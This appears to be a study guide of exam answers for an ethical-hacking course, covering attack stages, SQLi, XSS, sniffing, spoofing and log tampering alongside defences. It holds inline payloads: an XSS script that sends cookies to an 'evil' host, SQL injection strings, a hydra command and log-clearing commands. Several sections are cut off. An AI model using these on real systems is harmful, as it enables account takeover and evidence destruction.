What are the different stages involved in hacking? [3] Kill chain
→ M1-2 (Hacker Landscape)
AnswerFive stages: (1) Reconnaissance — gather target info; (2) Scanning & Enumeration — find hosts, ports, services, users; (3) Gaining access — exploit a vuln to get in; (4) Maintaining access — plant backdoor/persistence; (5) Clearing logs — cover tracks. Some lists add privilege escalation between 3 and 4.
Worked detail

Worked detail — Stages of hacking

Definition. Hacking in the ethical context is the authorised, structured process of discovering and exploiting weaknesses in a target system to prove a security failure exists. The industry standard is the five-phase CEH methodology: Reconnaissance, Scanning, Gaining Access, Maintaining Access and Covering Tracks.

Mechanism (the five stages).

  1. Reconnaissance (foot printing): passive or active information gathering — whois, DNS, search engines, social media, job posts.
  2. Scanning: find live hosts, open ports, services, OS and known vulnerabilities with ping sweeps, nmap and vulnerability scanners.
  3. Gaining access: exploit a discovered flaw (weak authentication, SQL injection, unpatched service, stolen credentials) to enter the system.
  4. Maintaining access: install backdoors, rootkits or rogue accounts so the entry can be reused; escalate privileges.
  5. Covering tracks: clear or alter logs, hide files and erase artifacts to avoid detection.

Example. An auditor footprints example.com, scans and finds an unpatched SMTP service, gains a shell, adds a hidden admin account, then removes the relevant /var/log entries — demonstrating each phase.

Exam tip: Draw the 5-phase chain and name one tool per phase; examiners award marks for the sequence and for separating active from passive reconnaissance.

Pitfall: Do not present hacking as a single "run an exploit" step — the pre-attack information gathering is worth marks.

Define the basic elements of information security. [3] CIA
→ M1-1 (Elements of InfoSec)
AnswerCIA triad: Confidentiality — only authorized parties see the data; Integrity — data is unaltered by unauthorized parties; Availability — authorized users can access it when needed. Extended by AAA: Authentication, Authorization, Accounting.
Worked detail

Worked detail — Elements of information security

Definition. Information security protects the confidentiality, integrity and availability of data and the systems that hold it. The basic elements are the CIA triad plus authenticity, non-repudiation, accountability and access control.

Mechanism.

  • Confidentiality: only authorised parties read the data — encryption (AES, RSA), access control lists and authentication.
  • Integrity: data is not altered without authorisation — hashing (SHA-256), digital signatures and version control.
  • Availability: systems and data are ready when needed — redundancy, backups, RAID, failover, DoS protection.
  • Authenticity: proof that a user, message or source is genuine — passwords, certificates, biometrics, PKI.
  • Non-repudiation: the sender cannot deny an action — digital signatures, audit logs, timestamps.

Example. An online transfer is encrypted in transit (confidentiality), carries a hash/signature (integrity + authenticity + non- repudiation), and the bank keeps the service up with redundant servers (availability).

Security = C + I + A, supported by authenticity and non-repudiation.

Exam tip: Give one concrete technology for each element — bare definitions of CIA usually earn only half the marks.

What is foot printing? How is it done? [3] Footprinting
→ M2-1 (Footprinting/Scanning)
AnswerFootprinting = passive + active info gathering to map the target's attack surface. Passive (no packet touches target): WHOIS, DNS, OSINT, archives. Active (touches target): ping sweeps, port scans, banner grabbing, zone transfers.
Worked detail

Worked detail — Foot printing

Definition. Foot printing is the first reconnaissance phase: the systematic collection of as much information as possible about a target network, system, organisation and its people, before any attack is launched. It converts an unknown target into a mapped one.

How it is done (method).

  1. Passive: collect without touching the target — whois, DNS records, search engines, Google hacking (site:, filetype:), social media, job advertisements, archived pages.
  2. Active: interact with the target — ping, traceroute, port scans, banner grabbing, DNS zone transfers, SMTP enumeration.
  3. Organise: correlate IPs, domains, subnets, emails, employee names and technologies into a target profile.
  4. Analyse: identify likely vulnerabilities and entry points from the collected data.

Example. whois example.com reveals the registrar and admin email; a Google query site:example.com filetype:pdf exposes internal documents; nslookup -type=AXFR may dump the whole zone.

Exam tip: Always contrast passive (no packets sent to target, undetectable) with active (detectable, logged) foot printing.

How is Distributed DoS different from DoS? [3] DoS/DDoS
→ M3-1 (DoM/DDoS)
AnswerDoS floods one target from a single source to exhaust resources. DDoS uses many compromised machines (a botnet) at once — far harder to block by IP and much higher volume.
Worked detail

Worked detail — DoS vs DDoS

Definition. Denial of Service (DoS) is an attempt to make a legitimate resource unavailable by overwhelming it with traffic or exhausting its resources. Distributed DoS (DDoS) is the same goal achieved from many compromised machines (a botnet) acting at once.

Explain network sniffing. [3] Sniffing
→ M3-1 (Network Sniffing)
AnswerSniffing = capturing packets on a network. On a hub or via ARP spoofing (NIC in promiscuous mode) an attacker reads others' traffic — especially plaintext protocols (Telnet, FTP) — to steal credentials. Defense: switched networks, encryption.
Worked detail

Worked detail — Network sniffing

Definition. Network sniffing (packet capture) is the process of capturing and inspecting every packet traversing a network segment, using a packet analyser in promiscuous mode. Legitimate use: troubleshooting and intrusion analysis; malicious use: stealing credentials sent in clear text.

Mechanism. A NIC normally accepts only frames addressed to it. In promiscuous mode it accepts all frames on the collision domain. A capture tool (Wireshark, tcpdump, Ettercap) hooks the driver, buffers frames and decodes protocols layer by layer. On switched networks the attacker must first defeat the switch — via ARP spoofing, MAC flooding or a SPAN/mirror port — to see others' traffic.

Example. Running tcpdump -i eth0 port 23 on a hub or a mirrored port reveals Telnet usernames and passwords in plain text; capturing HTTP shows session cookies that can be replayed.

Countermeasure: encryption (HTTPS, SSH, VPN), switch port security, dynamic ARP inspection, and IDS alerts on promiscuous NICs.

Exam tip: Mention promiscuous mode and the switched-network problem (ARP poisoning / SPAN port) — that is what distinguishes a full-credit answer.

How is Brute-force attack performed? [3] Brute force
→ M3-1 (Brute Force)
AnswerAn attacker tries many candidate credentials/keys until one works: exhaustive (all combos), dictionary (wordlist), hybrid, credential stuffing, rainbow tables. Defense: lockout, rate-limiting, 2FA, strong passwords.
Worked detail

Worked detail — Brute-force attack

Definition. A brute-force attack tries every possible credential combination until the correct one is found. It is exhaustive and unintelligent in principle, but dictionary and rule-based variants make it practical by trying likely passwords first.

Mechanism / steps.

  1. Identify the target service — SSH, RDP, FTP, HTTP login form, or a password hash file.
  2. Build a wordlist (rockyou.txt, common passwords) and add mutation rules (leetspeak, appended digits).
  3. Automate attempts with a tool: hydra -l admin -P pass.txt target ssh, John the Ripper or Hashcat for offline hashes.
  4. Observe responses — successful login, changed hash, or "account locked" message — and record the match.

Example. Hydra tests FTP logins at 50 threads; John cracks a stolen SHA-1 hash offline at millions of guesses per second.

Search space ≈ N^L for alphabet size N and length L — why long, complex passwords resist brute force.

Pitfall: Forgetting account lockout, CAPTCHA and rate limiting; a good answer always states both the attack steps and the defences (strong passwords, salts, lockout, MFA).

Exam tip: Distinguish online (rate-limited) from offline (hash-based, unlimited speed) brute force.

What is SQL injection? How can you find whether the website is affected by SQL injection? [3] SQLi
→ M4-1 (SQL Injection)
AnswerSQLi inserts malicious SQL into an input to manipulate the backend DB. Test with a single quote ' or ' OR '1'='1 in a parameter — a DB error or a changed page (boolean/UNION) shows the input is executed. Fix: parameterized queries.
Worked detail

Worked detail — SQL injection

Definition. SQL injection (SQLi) is a vulnerability in which untrusted user input is concatenated into an SQL query, so the input is executed as code. It can bypass authentication, dump databases or destroy data.

Mechanism. A vulnerable backend builds SELECT * FROM users WHERE name='"+user+"'. Supplying ' OR '1'='1 closes the string and makes the WHERE clause always true, logging the attacker in without a password.

Detection (finding it).

  1. Test every input (forms, URL parameters, cookies, headers) with ', ", ;-- and observe SQL errors.
  2. Use boolean pairs: ' OR 1=1-- vs ' AND 1=0-- — a different response indicates injection.
  3. Use time-based payloads e.g. SLEEP(5) / WAITFOR DELAY '0:0:5' and measure the delay.
  4. Confirm with UNION enumeration, ORDER BY to find column count, and tools such as sqlmap.

Prevention: parameterised queries / prepared statements, stored procedures, input validation, least-privileged DB accounts, WAF.

Exam tip: Show one payload AND name the fix (prepared statements) — examiners look for both detection and remediation.

What is cross-site scripting and what are its different variations? [3] XSS
→ M4-1 (XSS)
AnswerXSS runs malicious script in a victim's browser. Stored (payload saved on server, hits every viewer); Reflected (payload in request/URL reflected back); DOM-based (client-side DOM change). Defense: output encoding, CSP, HttpOnly cookies.
Worked detail

Worked detail — Cross-site scripting

Definition. Cross-site scripting (XSS) injects malicious JavaScript into a web page that is then executed in another user's browser, allowing cookie theft, session hijacking, keylogging or defacement.

Variations.

  • Reflected (non-persistent): the payload is in the request (e.g. a search query) and is echoed immediately in the response. Needs the victim to click a crafted link.
  • Stored (persistent): the payload is saved on the server (comment, forum post, profile) and executes for every visitor — the most dangerous form.
  • DOM-based: the flaw is in client-side JavaScript that writes URL data into the DOM (document.write, innerHTML); the payload never reaches the server.

Example. A comment containing <script>document.location='http://evil/?c='+document.cookie</script> stored in a guestbook steals every reader's session cookie.

Prevention: context-aware output encoding, input validation, Content Security Policy, HttpOnly cookies, framework auto-escaping.

Exam tip: Name all three types with one example each; state that XSS is a client-side injection while SQLi targets the database.

List out the challenges in password cracking. [3] Password cracking
→ M5-1 (Password Cracking)
AnswerChallenges: large keyspace on strong/long passwords; salting + slow hashes (bcrypt/Argon2); account lockout/rate-limiting blocks online tries; 2FA defeats a stolen password; hard-to-obtain offline hashes.
Worked detail

Worked detail — Password cracking challenges

Definition. Password cracking is recovering a password from a stored hash or a login service, usually with dictionaries, rules and brute force. The "challenges" are the factors that slow or prevent it.

Key challenges.

  1. Salting: a unique random salt per password makes precomputed rainbow tables useless and prevents identical hashes revealing identical passwords.
  2. Slow, memory-hard hashes: bcrypt, scrypt, Argon2 and PBKDF2 deliberately cost time/memory, cutting guess rates dramatically.
  3. Password length and complexity: entropy grows exponentially — N^L — so long passphrases are infeasible to brute force.
  4. Account lockout / rate limiting / CAPTCHA: throttle online guessing and can lock the account.
  5. Multi-factor authentication: even a correct password is insufficient without the second factor.
  6. Unknown hash format / encryption and legal constraints: identifying the algorithm and having authorised access matter.

Example. An unsalted MD5 hash falls in seconds with a rainbow table; a bcrypt hash with cost 12 may take days per password.

Exam tip: Lead with salting and slow hashes; then mention lockout, length and MFA. Link each challenge to the countermeasure it provides.

Define Event logging. [3] Event logging
→ M5-1 (Event Logging)
AnswerEvent logging records OS/app/device activity (logons, file access, errors) for auditing and forensics. Windows has six default categories: Application, System, Security, Directory Service, DNS Server, File Replication Service.
Worked detail

Worked detail — Event logging

Definition. Event logging is the automatic recording of significant system and application events — logins, file access, process starts, configuration changes, errors — into a chronological, tamper-evident record (the event log / audit trail).

Mechanism. The OS or application emits events with a timestamp, source, event ID and description. On Windows they go to the Event Log (Application, Security, System); on Linux to /var/log via syslog/rsyslog/journald. Logs support detection, incident response, accountability and non-repudiation, and are a core safeguard under CO5.

Example. Event ID 4624 records a successful logon and 4625 a failed one; a burst of 4625s followed by a 4624 suggests a brute-force attack that succeeded.

Audit trail = who + what + when + where + outcome.

Pitfall: Attackers "cover tracks" by clearing or altering these logs, so defenders must forward logs to a central, write-once SIEM and protect them with file permissions.

Exam tip: Tie logging to non-repudiation and incident handling, and mention centralised, protected log storage as the defence against log tampering.

Worked detail — Security challenges & vulnerability assessment (Module I)

(a) Six security challenges — 6 marks

Information security must constantly balance protection with usability while the threat landscape changes. Six major challenges are:

  1. Evolving, sophisticated threats — APTs, zero-days, ransomware-as-a-service and fileless malware defeat signature-based defences.
  2. Insider threats — disgruntled or careless employees already have legitimate access, making misuse hard to detect.
  3. Social engineering — phishing and pretexting target the human layer, bypassing technical controls entirely.
  4. BYOD, mobile and cloud — personal devices, remote work and shared cloud storage dissolve the traditional perimeter and create data-egress risks.
  5. Complexity and misconfiguration — sprawling hybrid networks, IoT and third-party integrations produce gaps, default settings and shadow IT.
  6. Compliance, cost and skills — meeting GDPR/IT Act/PCI-DSS obligations, limited budgets and a shortage of skilled staff leave controls unimplemented or unmonitored.

(b) Vulnerability assessment — 8 marks

Vulnerability assessment (VA) is a systematic, automated process of discovering, classifying and prioritising weaknesses in systems, applications and networks. Unlike a penetration test, VA stops at identification and recommendation; it does not deliberately exploit the flaw.

Process (numbered):

  1. Define scope and assets — obtain authorisation, list in-scope hosts, applications and network segments.
  2. Discovery / enumeration — find live hosts, open ports, services, OS versions and installed software (Nmap, netbios/enumeration tools).
  3. Vulnerability scanning — run scanners (Nessus, OpenVAS, Qualys, Nikto) with credentialed and uncredentialed checks.
  4. Analysis and validation — remove false positives, correlate with CVE/CVSS, and confirm the business impact.
  5. Prioritisation and reporting — rank by severity (CVSS score × asset criticality) and deliver a report with remediation steps and a retest schedule.

Worked detail — Module I — Q11 (OR Q12)

(a) Role of security and penetration testers (6 marks)

Definitions. A security tester evaluates the overall security posture of an organisation — policies, controls, configurations and awareness — to find weaknesses before attackers do. A penetration tester (pentester) goes further: with written authorisation they actively simulate real attacks against a defined scope to prove whether a vulnerability can actually be exploited and how far an attacker can get.

Core roles and responsibilities.

  1. Asset discovery and scoping — define the rules of engagement, assets, test windows and legal boundaries before touching anything.
  2. Vulnerability identification — use automated scanners and manual techniques to find misconfigurations, unpatched software and logical flaws.
  3. Exploitation (controlled) — safely prove impact, chain findings, and demonstrate real-world risk without damaging data or availability.
  4. Post-exploitation assessment — measure privilege escalation, lateral movement and data access to show the true blast radius.
  5. Reporting and remediation guidance — rank findings by severity/CVSS, explain business impact and give concrete fix recommendations; re-test after fixes.
  6. Compliance and assurance — map tests to standards (ISO 27001, PCI-DSS, OWASP ASVS) and support risk registers and audit.

Significance. They provide an independent, attacker's-eye view, validate that controls actually work, reduce breach probability and cost, and satisfy regulatory and customer-trust requirements. Ethical boundaries — permission, scope, confidentiality, non-destructive testing and full disclosure of findings — distinguish them from malicious hackers.

Testers protect the CIA triad (confidentiality, integrity, availability) and add accountability and non-repudiation through detailed, signed logs.

Role of a penetration tester (8) & how vulnerability assessment is done (6). [14] M1
→ M1-2 · → M1-3
Answer

Role of a penetration tester (8): an authorized security professional who thinks like an attacker to find weaknesses, prove business impact, and recommend fixes — without damaging systems. Bound by a rules of engagement contract (scope, timing, methods, what not to do). Works through the kill chain (recon → scan → exploit → maintain → report), documents evidence, and hands over a remediation plan. Distinct from malicious hackers: permission + ethics + reporting.

Vulnerability assessment (6):

  • Define scope and assets.
  • Run authenticated/unauthenticated scanners (Nessus, OpenVAS).
  • Discover known vulns/CVEs, misconfigurations, weak policies.
  • Rank by severity (CVSS) and exploitability.
  • Produce a remediation report with owners + deadlines.
  • Re-scan to confirm fixes (closure).

Note: a vulnerability assessment finds and lists weaknesses; a penetration test goes further and exploits to prove impact.

Worked detail

Worked detail — Role of a penetration tester

A penetration tester (ethical hacker) is an authorised security professional who legally simulates real-world attacks against an organisation's systems to discover exploitable weaknesses before malicious actors do. The role is bounded by a signed rules-of-engagement document that defines scope, timing, permitted techniques and emergency contacts.

Key responsibilities and mechanism:

  • Perform reconnaissance and enumerate assets, then identify and validate vulnerabilities with manual checks and scanners (Nessus, Burp Suite, Metasploit).
  • Exploit confirmed weaknesses in a controlled way to demonstrate real business impact — never cause damage or exfiltrate real data.
  • Analyse risk as Threat × Vulnerability × Impact, rank findings, and produce a written report with evidence, remediation advice and a retest plan.
  • Maintain strict confidentiality, operate under legal authorisation (e.g. Computer Misuse Act / IT Act provisions), and log every action for auditing.

Example: a tester finds that a client's public web form is vulnerable to SQL injection, proves it by reading only a harmless test row, then reports the flaw with a parameterised-query fix; a malicious attacker would instead dump the entire customer table.

Pitfall: do not describe the tester as someone who "hacks for fun". The defining features are authorisation, scope limits and reporting.
Exam tip: 3 marks = definition + 3–4 roles + one example. Explicitly mention "authorised/legal" and "rules of engagement" — examiners look for those keywords.

Worked detail — Vulnerability Assessment in Penetration Testing

Vulnerability assessment (VA) is the systematic process of discovering, classifying and prioritising security weaknesses in a system, network or application. Unlike a full penetration test, it identifies and reports flaws but does not necessarily exploit them.

Mechanism / procedure:

  1. Define scope — which hosts, networks or applications are in scope and what tooling is allowed.
  2. Discover assets — enumerate live hosts, open ports and running services (for example with a port scanner).
  3. Scan — automated scanners (Nessus, OpenVAS, Qualys) probe for known CVEs, misconfigurations and weak defaults.
  4. Analyse and validate — remove false positives and assign severity (CVSS score: Low / Medium / High / Critical).
  5. Report and remediate — rank by risk and recommend patches or configuration changes.

Example: A scan reveals an Apache server missing a security patch (a High CVE) and an FTP service allowing anonymous login (Medium). The report recommends patching and disabling anonymous access.

Note: VA is breadth-first and largely automated; penetration testing is depth-first and proves exploitability by chaining flaws. A VA answers "what is wrong?"; a pen test answers "can it actually be broken, and how far can an attacker get?"
Exam tip: Contrast VA with penetration testing in one sentence — VA = automated discovery + prioritisation; PT = manual exploitation + impact demonstration. Include the CVSS/CVE terms; they are high-value keywords.

Dumpster diving (8): retrieving discarded paper/bin to harvest sensitive data — passwords on sticky notes, org charts, network diagrams, letterheads (for spoofing), source code, calendars. Worked detail — Q13(a) — Dumpster diving

Definition. Dumpster diving is a physical social- engineering attack in which an attacker retrieves sensitive information from discarded material — paper documents, media, hardware — that the organisation failed to destroy securely.

Method — a staged demonstration.

  1. Target selection & observation: identify the organisation's waste bins and collection schedule; note when cleaning staff take refuse to an external dumpster.
  2. Pretext / entry: dress as a cleaner or contracted waste worker, or simply collect from an unsecured kerbside bin — no forced entry is needed.
  3. Collection: remove bags of paper, old hardware, CDs, USB drives and take them off-site for analysis.
  4. Information extraction: sift for bank statements, customer records, printed emails, employee lists, phone books, usernames, passwords written on notes, and configuration printouts.
  5. Exploitation: use the recovered names and internal details to craft a convincing phishing/pretext call, or reuse discovered credentials to log in remotely.
  6. Document & report: log each item found and show how it could be leveraged — this demonstrates the business risk.

Example. A printed server inventory with internal IPs and an old employee's login note is recovered; the attacker calls the help desk pretending to be that employee and resets the password.

Countermeasures: shred all paper (cross-cut), wipe/destroy disks and media, lock dumpsters on site, security awareness training, and a clear document-destruction policy.

Exam tip (8 marks): Present the attack as a numbered procedure and always append defences — examiners reward the "attack + mitigation" pairing.

Worked detail — Dumpster Diving

Definition. Dumpster diving is a physical social-engineering and information-gathering attack in which an attacker sifts through discarded material — trash bins, recycling, old media, printed records — to recover confidential information that has not been securely destroyed.

Mechanism and targets. The attacker looks for items that were thrown away rather than shredded: bank statements, invoices, printouts of credentials, sticky notes, old USB drives and hard disks, discarded laptops, packaging with barcodes and employee directories. Even "junk" yields names, usernames, account numbers and internal jargon that make later phishing or pretexting far more convincing. Attackers may pose as sanitation workers or simply collect bins put out on collection night.

Example. An attacker retrieves a company's discarded boxes and finds a quarterly report and a help-desk password written on a notepad; the employee directory supplies names and email formats for a targeted phishing campaign.

Exam tip: Classify it as low-tech but high-yield social engineering. Countermeasures worth one line each: cross-cut shredding, shred-all policies, locked "secure disposal" bins, media degaussing/wiping, and employee training. Note the legal wrinkle (trespass laws vary), which examiners like to see.

Social enumeration (6) & working of network sniffers (8). [14] M2/M3
→ M2-1 (Enumeration) · → M3-1 (Sniffing)
Answer

Social enumeration (6): extracting detailed info from people/services — usernames via SMTP VRFY/RCPT, shares via SMB null sessions, config via SNMP (default public community), DNS zone transfers (AXFR), LDAP queries. Gives the exact accounts/services to target.

Working of network sniffers (8): a sniffer (Wireshark, tcpdump) captures packets on the wire. Normally a switched network delivers frames only to the destination MAC, but the attacker:

  • puts the NIC in promiscuous mode, and/or
  • performs ARP spoofing to become the MITM, so victim traffic is mirrored to them.

They then filter for plaintext protocols (Telnet, FTP, POP3, HTTP) and recover credentials/session data. Types: software vs hardware tap; passive (observe) vs active (inject); filtered vs unfiltered capture. Defense: switched networks, encryption (SSH/TLS/VPN), static ARP, port security.

Worked detail — Q14(b) — Working of network sniffers

Definition. A network sniffer (protocol analyser) captures and decodes packets passing through a network segment. Examples: Wireshark, tcpdump, Ettercap, Cain and Abel.

Working — step by step.

  1. NIC in promiscuous mode: the interface is told to accept all frames, not just those addressed to its MAC.
  2. Capture driver: libpcap/WinPcap copies frames from the driver buffer to user space before the stack discards them.
  3. Filtering: a capture filter (BPF), e.g. tcp port 80, limits what is stored.
  4. Decoding: the analyser parses each layer — Ethernet → IP → TCP/UDP → application — and reassembles streams.
  5. Analysis / display: protocol hierarchy, follow-stream, statistics and string search reveal credentials and data.

Switched network issue. A switch sends frames only to the destination port, so the attacker uses ARP spoofing, MAC flooding or a SPAN/mirror port to obtain others' traffic.

Worked detail — Q14(a) — Social enumeration

Definition. Social enumeration is the systematic collection of information about people — employees, partners, customers — and their relationships, roles and habits, to support social engineering or credential attacks. It is the human counterpart of network enumeration.

How it is performed.

  1. Identify the organisation's people: harvest names and email addresses from the company site, whois records, press releases and search engines (theHarvester, Maltego).

Worked detail — Q15(a) — DNS manipulation via ARP spoofing

Definition. ARP spoofing (ARP poisoning) sends forged ARP reply messages that associate the attacker's MAC address with another host's IP — typically the gateway. Once traffic is diverted through the attacker, DNS answers can be forged (DNS spoofing/poisoning) to redirect victims to malicious sites.

Step-by-step mechanism.

  1. The attacker learns the gateway IP (e.g. 192.168.1.1) and victim IP.
  2. Using a tool (Ettercap, arpspoof, Cain), the attacker sends gratuitous ARP replies: "192.168.1.1 is at attacker's MAC" and "victim is at attacker's MAC".
  3. Victim's ARP cache is poisoned; its traffic now goes to the attacker, who forwards it to the real gateway to avoid suspicion (MITM).
  4. The attacker runs a fake DNS responder and sniffs DNS queries. When the victim asks for www.bank.com, the attacker returns a forged A record pointing to a fake IP before the real DNS reply arrives.
  5. The victim's DNS cache stores the fake mapping and connects to the attacker's server, which can harvest credentials.
 victim --(forged ARP: GW=attackMAC)--> attacker --> real gateway
 victim DNS query "bank.com" --> attacker --> forged "A bank.com = 10.0.0.66"
 victim browser --> fake bank.com (phishing page)

Countermeasures: Dynamic ARP Inspection (DAI), DHCP snooping, static ARP entries, DNSSEC, encrypted DNS (DoH/DoT), HTTPS and IDSC alerting on ARP changes.

(a) DNS spoofing and its consequences (6 marks)

Definition. DNS spoofing (DNS poisoning/cache poisoning) is an attack in which false DNS mapping data is introduced into a resolver's cache so that a legitimate hostname resolves to an attacker-controlled IP address. Victims who type the correct URL are silently redirected to a malicious site.

Worked detail — Q16(b) — Attacking SQL servers

Definition. SQL servers are attacked when applications pass untrusted input into queries, or when the database itself is exposed with weak credentials or default settings. The result is unauthorised data access, modification or destruction.

Attack vectors and procedure.

Worked detail — Q16(a) — DHCP spoofing

Definition. DHCP spoofing is an attack in which a rogue DHCP server responds to clients before the legitimate one, handing out malicious network configuration — above all, the attacker's machine as the default gateway and DNS server.

Mechanism / steps.

  1. A client broadcasts DHCPDISCOVER to obtain an IP address.
  2. The attacker's rogue DHCP server races the real server and replies with DHCPOFFER containing a valid-looking IP, subnet and DNS — but a malicious gateway (the attacker's IP).
  3. The client accepts the offer (usually the first reply wins) and configures its routing table through the attacker.
  4. All traffic leaving the victim now passes through the attacker, enabling sniffing, MITM, DNS spoofing and credential theft.
  5. The attacker forwards packets to the real gateway so the victim sees no interruption.
 client --DHCPDISCOVER--> * (broadcast)
        <--DHCPOFFER(gateway=attacker)-- rogue DHCP  [wins race]
        <--DHCPOFFER(gateway=real)----- real DHCP
 client traffic --> attacker --> real gateway  (MITM)

Example. Tools such as Yersinia or DHCPig set up a rogue server; a victim then resolves www.mail.com through the attacker's DNS to a phishing clone.

Countermeasures: DHCP snooping on switches (trust only legitimate server ports), DAI, 802.1X, port security, and monitoring for unexpected DHCPOFFERs.

Worked detail — SQL Injection

SQL injection (SQLi) is a web application vulnerability in which untrusted user input is concatenated into a SQL query and interpreted as code rather than as data. It arises when applications fail to validate or properly parameterise input.

Mechanism: The attacker submits input containing SQL syntax (for example a quote followed by an always-true condition such as ' OR '1'='1) into a form field or URL parameter. Because the input is built directly into the query string, the database executes the altered statement. By varying the input, the attacker can bypass authentication, read tables they should not see (UNION-based), infer data through true/false responses (blind SQLi), or, with sufficient privileges, modify or delete records.

Effect on web applications: Unauthorised access to user accounts, disclosure of entire databases (credentials, card data), data corruption or deletion, and in some configurations escalation to operating-system command execution and full server compromise. It also causes legal and reputational damage.

Countermeasures: Parameterised queries / prepared statements (the primary defence), stored procedures, input validation and allow-listing, least-privilege database accounts, ORM usage, disabling verbose error messages, and a WAF as defence in depth.

Pitfall: Escaping special characters alone is not a reliable fix. The single strongest answer is "use parameterised queries so data is never treated as code".

Worked detail — Q19(a) — Hiding evidence by altering event logs

Definition. Attackers "cover their tracks" by modifying or destroying the event logs that would otherwise record their actions — a Module 5 technique that defeats detection and non-repudiation.

Common methods.

  1. Clearing the log: wipe the entire event log — Windows wevtutil cl Security or clearlog; Linux > /var/log/auth.log. Obvious to investigators because a gap appears.
  2. Deleting / selective editing: remove only specific events (an anomalous logon, a process start) so the log looks continuous and natural.

Example. After a privilege escalation the attacker clears Event ID 4672 (special privileges assigned) and rewrites the log file's modification time to blend in.

Worked detail — Q20(a) — Password cracking for system hacking

Definition. Password cracking recovers or guesses a user's password to gain unauthorised access to a system. In system hacking it is used after enumeration to obtain the credentials needed for login, privilege escalation and persistence.

How it is used in system hacking (procedure).

Worked detail — Security challenges with routers

Routers are the traffic directors of a network, and their compromise can expose or disable an entire organisation. The main security challenges are:

  • Weak credentials and defaults: factory usernames/passwords (admin/admin), Telnet instead of SSH, and default SNMP community strings (public/private) allow easy takeover and information leakage.
  • Unpatched firmware / IOS: known CVEs in the routing OS and services (e.g. SNMP, SSH, web admin) are exploited by bots and worms.
  • Misconfiguration: overly permissive ACLs, open management ports to the internet, no logging, and unused interfaces left up create attack surface.
  • Routing-protocol attacks: BGP hijacking, OSPF/IS-IS spoofing, route poisoning and RIP attacks can redirect or black-hole traffic.
  • Resource and physical attacks: CPU/memory exhaustion DoS, and physical tampering or console access if the device is not secured in a locked rack.

Example: an attacker who guesses the SNMP community string can read the router configuration, learn internal addressing and rewrite the routing table to send traffic through a malicious hop.

Exam tip: Cover default credentials, firmware patches, misconfiguration, routing-protocol abuse and physical security. Countermeasure keywords: SSH only, SNMPv3, ACLs, MD5-authenticated routing updates, and centralised logging.

Worked detail — IDS vs IPS

Definition. An IDS (Intrusion Detection System) is a passive monitoring device that detects and alerts on suspicious activity; an IPS (Intrusion Prevention System) is an inline device that detects and actively blocks the malicious traffic in real time.

Mechanism and differences. An IDS sits out-of-band, receiving a copy of traffic via a SPAN port or tap — it never sits in the packet path, so it cannot stop an attack, only alert, log or trigger a response. An IPS is deployed inline so all traffic passes through it; on detecting a signature or anomaly it drops the packet, resets the connection or blocks the source. Consequently an IPS can cause false-positive outages and adds latency, while an IDS is safer to deploy but reactive.

Worked detail — Generations of firewall

Firewall technology has evolved through five broad generations, each filtering at a higher level of the OSI model:

  1. First generation — packet-filtering firewalls: stateless ACLs that inspect source/destination IP, port and protocol at the network/transport layer. Fast but blind to application context and easily spoofed.
  2. Second generation — application-level / proxy gateways: terminate the connection and inspect the application payload (Layer 7); circuit-level gateways validate sessions at the session layer. Stronger inspection but slower.
  3. Third generation — stateful inspection firewalls: track the state of each connection in a state table and allow only packets belonging to established sessions — the standard enterprise firewall.
  4. Fourth generation — deep-packet inspection (DPI) / NGFW: inspect application-layer content, perform protocol analysis and integrate IPS; can identify applications regardless of port.
  5. Fifth generation — next-generation / cloud and AI-driven firewalls: combine NGFW with threat intelligence, sandboxing, TLS inspection, user identity and zero-trust / SaaS delivery (FWaaS).
Some textbooks merge the fourth and fifth generations or list only four (packet, application proxy, circuit-level, stateful). Mention both views if unsure — the sequence must always be from simple stateless filtering to deeper, stateful, application-aware inspection.

Worked detail — Session Hijacking

Session hijacking is an attack in which an adversary takes over a legitimate user's active session by stealing or predicting the session identifier (session ID / token), thereby gaining the same access as the authenticated user without knowing the password.

Mechanism: Web applications are stateless, so they track logged-in users with a session token stored in a cookie or URL. Worked detail — Preventive measures for dumpster diving

Dumpster diving is a physical social-engineering attack in which an attacker retrieves sensitive information from discarded trash — paper documents, CDs, USB drives or old hardware. Prevention combines physical, procedural and technical controls.

  • Shred everything sensitive: use cross-cut (Level P-4 or higher) shredders for documents; shred or wipe CDs, DVDs and hard disks before disposal.

  • Policy and training: enforce a clean-desk/clean-bin policy, teach staff that even a name, badge or phone number is useful to an attacker, and forbid discarding media in public bins.
  • Physical and legal controls: fencing, lighting, guards and trespass signage; place bins off-site under supervision.

Example: a bank that cross-cut shreds statements, locks bins inside a guard-controlled loading bay and audits its disposal vendor defeats a diver who would otherwise reconstruct account numbers from torn printouts.

Worked detail — Q17(b) — Reverse engineering

Definition. Reverse engineering is the process of analysing a compiled program, binary or malware to discover its structure, logic and behaviour without the original source code. In ethical hacking it is used to understand malicious code and find vulnerabilities.

Procedure.

  1. Static analysis (without running): inspect file type and headers with file and PE/ELF tools; extract strings with strings; view imports, sections and packers with PE Explorer or objdump.
  2. Disassembly: convert machine code to assembly with IDA Pro, Ghidra, radare2 or objdump; identify functions, loops, API calls and constants.
  3. Decompilation: produce pseudo-code (Ghidra, Hex-Rays, dnSpy for .NET, CFR for Java) to recover high-level logic.
  4. Dynamic analysis (in a sandbox): run in an isolated VM and observe with a debugger (OllyDbg, x64dbg, gdb), process monitor (ProcMon) and a network sniffer; record file, registry and network activity.
  5. Interpret & document: reconstruct the algorithm or behaviour, identify indicators of compromise and write the analysis report.

Example. A packed Trojan is unpacked in a sandbox, strings reveal a C2 domain, and disassembly shows a keylogger hook — yielding IOCs for the IDS.

Pitfall: Never run unknown malware on a production machine; always use an isolated, disposable VM with no shared folders.

Worked detail — Examining encrypted files

Definition. Examining an encrypted file means recovering its plaintext contents (or at least useful information about it) without necessarily possessing the authorised decryption key. The approach depends on whether the key can be found, guessed or bypassed.

Methods, from easiest to hardest.

  1. Locate the legitimate key / password. Search for stored keys, configuration files, browser-saved passwords and written notes; ask the owner; check key rings and password managers.
  2. Crack the password. If the file is password-protected, use dictionary, rule-based or brute-force attacks with tools such as John the Ripper, Hashcat or the archive/PDF cracker for the specific format. GPU acceleration and wordlists make this practical for weak passwords.
  3. Capture the key in use. Keyloggers, memory (RAM) scraping, cold-boot attacks and API hooking can recover a key while the file is legitimately open — after it is closed, the key often vanishes from memory.
  4. Exploit weak key management or implementation. Predictable random number generators, hard-coded keys, ECB mode patterns and known-plaintext attacks can reveal data without brute force.
  5. Cryptanalysis / known algorithms. Legacy ciphers (DES, WEP, weak RC4) may be broken directly; strong ciphers (AES-256) are infeasible to break by brute force.
